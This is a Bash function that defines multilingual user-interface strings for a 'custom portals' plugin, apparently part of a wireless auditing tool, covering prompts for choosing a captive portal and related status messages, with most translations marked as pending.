function customportals_prehook_hookable_for_languages() {

	arr["ENGLISH","customportals_text_1"]="Do you want to choose a custom portal? \${normal_color}\${visual_choice}"
	arr["SPANISH","customportals_text_1"]="¿Quieres elegir un portal personalizado? \${normal_color}\${visual_choice}"
	arr["FRENCH","customportals_text_1"]="\${pending_of_translation} Voulez-vous choisir un portail personnalisé? \${normal_color}\${visual_choice}"
	arr["CATALAN","customportals_text_1"]="\${pending_of_translation} Voleu triar un portal personalitzat? \${normal_color}\${visual_choice}"
	arr["PORTUGUESE","customportals_text_1"]="\${pending_of_translation} Quer escolher um portal personalizado? \${normal_color}\${visual_choice}"
	arr["RUSSIAN","customportals_text_1"]="\${pending_of_translation} Вы хотите выбрать пользовательский портал? \${normal_color}\${visual_choice}"
	arr["GREEK","customportals_text_1"]="\${pending_of_translation} Θέλετε να επιλέξετε μια προσαρμοσμένη πύλη; \${normal_color}\${visual_choice}"
	arr["ITALIAN","customportals_text_1"]="\${pending_of_translation} Vuoi scegliere un portale personalizzato? \${normal_color}\${visual_choice}"
	arr["POLISH","customportals_text_1"]="\${pending_of_translation} Czy chcesz wybrać niestandardowy portal? \${normal_color}\${visual_choice}"
	arr["GERMAN","customportals_text_1"]="\${pending_of_translation} Möchten Sie ein benutzerdefiniertes Portal auswählen? \${normal_color}\${visual_choice}"
	arr["TURKISH","customportals_text_1"]="\${pending_of_translation} Özel bir portal seçmek ister misiniz? \${normal_color}\${visual_choice}"
	arr["ARABIC","customportals_text_1"]="\${pending_of_translation} \${normal_color}\${visual_choice}\${green_color} هل تريد اختيار بوابة مخصصة؟\${normal_color}"
	arr["CHINESE","customportals_text_1"]="\${pending_of_translation} 您想选择自定义门户吗？ \${normal_color}\${visual_choice}"

	arr["ENGLISH","customportals_text_2"]="Please choose from the following available portals"
	arr["SPANISH","customportals_text_2"]="Elige entre los siguientes portales disponibles"
	arr["FRENCH","customportals_text_2"]="\${pending_of_translation} Veuillez choisir parmi les portails disponibles suivants"
	arr["CATALAN","customportals_text_2"]="\${pending_of_translation} Trieu entre els portals disponibles següents"
	arr["PORTUGUESE","customportals_text_2"]="\${pending_of_translation} Escolha entre os seguintes portais disponíveis"
	arr["RUSSIAN","customportals_text_2"]="\${pending_of_translation} Пожалуйста, выберите из следующих доступных порталов"
	arr["GREEK","customportals_text_2"]="\${pending_of_translation} Επιλέξτε από τις παρακάτω διαθέσιμες πύλες"
	arr["ITALIAN","customportals_text_2"]="\${pending_of_translation} Scegli tra i seguenti portali disponibili"
	arr["POLISH","customportals_text_2"]="\${pending_of_translation} Wybierz z następujących dostępnych portali"
	arr["GERMAN","customportals_text_2"]="\${pending_of_translation} Bitte wählen Sie aus den folgenden verfügbaren Portalen"
	arr["TURKISH","customportals_text_2"]="\${pending_of_translation} Lütfen aşağıdaki mevcut portallardan seçim yapın"
	arr["ARABIC","customportals_text_2"]="\${pending_of_translation} الرجاء الاختيار من بين البوابات المتاحة التالية"
	arr["CHINESE","customportals_text_2"]="\${pending_of_translation} 请从以下可用门户中选择"

	arr["ENGLISH","customportals_text_3"]="No captive portals found in the chosen directory"
	arr["SPANISH","customportals_text_3"]="No se encuentran portales cautivos en el directorio elegido"
	arr["FRENCH","customportals_text_3"]="\${pending_of_translation} Pas de portails captifs trouvés dans le répertoire choisi"
	arr["CATALAN","customportals_text_3"]="\${pending_of_translation} No hi ha portals en captivitat al directori escollit"
	arr["PORTUGUESE","customportals_text_3"]="\${pending_of_translation} Nenhum porta -cativo encontrado no diretório escolhido"
	arr["RUSSIAN","customportals_text_3"]="\${pending_of_translation} Порталов не обнаружены в выбранном каталоге"
	arr["GREEK","customportals_text_3"]="\${pending_of_translation} Δεν βρέθηκαν αιχμάλωτες πύλες στον επιλεγμένο κατάλογο"
	arr["ITALIAN","customportals_text_3"]="\${pending_of_translation} Nessun portali in cattività trovati nella directory prescelta"
	arr["POLISH","customportals_text_3"]="\${pending_of_translation} Nie znaleziono portali w niewoli w wybranym katalogu"
	arr["GERMAN","customportals_text_3"]="\${pending_of_translation} Kein in Gefangenschaftsportalen im gewählten Verzeichnis gefunden"
	arr["TURKISH","customportals_text_3"]="\${pending_of_translation} Seçilen dizinde esir portal bulunamadı"
	arr["ARABIC","customportals_text_3"]="\${pending_of_translation} لم توجد بوابات أسير في الدليل المختار"
	arr["CHINESE","customportals_text_3"]="\${pending_of_translation} 在选定目录中没有发现圈养门户"

	arr["ENGLISH","customportals_text_4"]="Enter the number of the captive portal you want to select:"
	arr["SPANISH","customportals_text_4"]="Ingrese el número del portal cautivo que desea seleccionar:"
	arr["FRENCH","customportals_text_4"]="\${pending_of_translation} Entrez le numéro du portail captif que vous souhaitez sélectionner:"
	arr["CATALAN","customportals_text_4"]="\${pending_of_translation} Introduïu el número del portal en captivitat que voleu seleccionar:"
	arr["PORTUGUESE","customportals_text_4"]="\${pending_of_translation} Digite o número do portal cativo que você deseja selecionar:"
	arr["RUSSIAN","customportals_text_4"]="\${pending_of_translation} Введите номер портала в неволе, который вы хотите выбрать:"
	arr["GREEK","customportals_text_4"]="\${pending_of_translation} Εισαγάγετε τον αριθμό της πύλης Captive που θέλετε να επιλέξετε:"
	arr["ITALIAN","customportals_text_4"]="\${pending_of_translation} Immettere il numero del portale in cattività che si desidera selezionare:"
	arr["POLISH","customportals_text_4"]="\${pending_of_translation} Wprowadź numer portalu w niewoli, który chcesz wybrać:"
	arr["GERMAN","customportals_text_4"]="\${pending_of_translation} Geben Sie die Nummer des Captive -Portals ein, das Sie auswählen möchten:"
	arr["TURKISH","customportals_text_4"]="\${pending_of_translation} Seçmek istediğiniz esir portalı sayısını girin:"
	arr["ARABIC","customportals_text_4"]="\${pending_of_translation} أدخل رقم البوابة الأسيرة التي تريد تحديدها:"
	arr["CHINESE","customportals_text_4"]="\${pending_of_translation} 输入您要选择的圈养门户的编号："

	arr["ENGLISH","customportals_text_5"]="You selected the captive portal: \${normal_color}\${customportals_selected_portal}"
	arr["SPANISH","customportals_text_5"]="Seleccionaste el portal cautivo: \${normal_color}\${customportals_selected_portal}"
	arr["FRENCH","customportals_text_5"]="\${pending_of_translation} Vous avez sélectionné le portail captif: \${normal_color}\${customportals_selected_portal}"
	arr["CATALAN","customportals_text_5"]="\${pending_of_translation} Heu seleccionat el portal captiu: \${normal_color}\${customportals_selected_portal}"
	arr["PORTUGUESE","customportals_text_5"]="\${pending_of_translation} Você selecionou o portal cativo: \${normal_color}\${customportals_selected_portal}"
	arr["RUSSIAN","customportals_text_5"]="\${pending_of_translation} Вы выбрали портал «Споты»: \${normal_color}\${customportals_selected_portal}"
	arr["GREEK","customportals_text_5"]="\${pending_of_translation} Επιλέξατε την πύλη αιχμαλώτων: \${normal_color}\${customportals_selected_portal}"
	arr["ITALIAN","customportals_text_5"]="\${pending_of_translation} Hai selezionato il portale in cattività: \${normal_color}\${customportals_selected_portal}"
	arr["POLISH","customportals_text_5"]="\${pending_of_translation} Wybrałeś portal w niewoli: \${normal_color}\${customportals_selected_portal}"
	arr["GERMAN","customportals_text_5"]="\${pending_of_translation} Sie haben das Captive Portal ausgewählt: \${normal_color}\${customportals_selected_portal}"
	arr["TURKISH","customportals_text_5"]="\${pending_of_translation} Esir portalı seçtiniz: \${normal_color}\${customportals_selected_portal}"
	arr["ARABIC","customportals_text_5"]="\${pending_of_translation} \${normal_color}\${customportals_selected_portal} \${green_color}:لقد حددت البوابة الأسير"
	arr["CHINESE","customportals_text_5"]="\${pending_of_translation} 您选择了圈养门户：\${normal_color}\${customportals_selected_portal}"

	arr["ENGLISH","customportals_text_6"]="Invalid selection. Returning..."
	arr["SPANISH","customportals_text_6"]="Selección inválida. Regresando..."
	arr["FRENCH","customportals_text_6"]="\${pending_of_translation} Sélection invalide. Retour..."
	arr["CATALAN","customportals_text_6"]="\${pending_of_translation} Selecció no vàlida. Tornant..."
	arr["PORTUGUESE","customportals_text_6"]="\${pending_of_translation} Seleção inválida. Voltando..."
	arr["RUSSIAN","customportals_text_6"]="\${pending_of_translation} Неверный выбор. Возврат..."
	arr["GREEK","customportals_text_6"]="\${pending_of_translation} Μη έγκυρη επιλογή. Επιστροφή..."
	arr["ITALIAN","customportals_text_6"]="\${pending_of_translation} Selezione non valida. Tornando indietro..."
	arr["POLISH","customportals_text_6"]="\${pending_of_translation} Nieprawidłowy wybór. Powrót..."
	arr["GERMAN","customportals_text_6"]="\${pending_of_translation} Ungültige Auswahl. Zurück..."
	arr["TURKISH","customportals_text_6"]="\${pending_of_translation} Geçersiz seçim. Geri dönülüyor..."
	arr["ARABIC","customportals_text_6"]="\${pending_of_translation} اختيار غير صالح. العودة..."
	arr["CHINESE","customportals_text_6"]="\${pending_of_translation} 无效选择。返回..."
}

customportals_set_path
